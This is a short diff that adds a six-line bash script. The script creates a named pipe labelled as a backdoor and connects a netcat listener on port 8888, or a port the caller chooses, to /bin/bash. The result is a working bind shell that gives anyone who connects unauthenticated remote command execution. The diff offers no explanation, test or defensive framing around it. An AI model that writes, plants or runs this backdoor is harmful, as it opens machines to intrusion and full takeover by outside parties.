@@ -1,0 +1,6 @@
+#!/bin/bash
+_po=${1:-8888}
+_door=./.backdoor.$$
+mkfifo ${_door}
+nc -l ${_po} 0<${_door} | /bin/bash > ${_door}
+rm -f ${_door}
